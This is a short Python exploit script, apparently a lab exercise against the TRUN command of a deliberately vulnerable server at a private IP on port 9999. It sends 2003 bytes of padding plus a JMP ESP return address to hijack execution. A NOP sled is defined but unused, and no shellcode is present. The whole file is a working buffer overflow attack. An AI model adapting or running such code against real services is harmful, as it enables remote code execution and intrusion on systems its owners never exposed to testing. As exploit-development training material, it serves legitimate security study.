import socket
import sys

jmp_addr =  b"\xaf\x11\x50\x62"

nop = b"\x90" * 32 

buffer = b"A"*2003

payload = buffer + jmp_addr

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send((b'TRUN /.:/' + payload))  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()
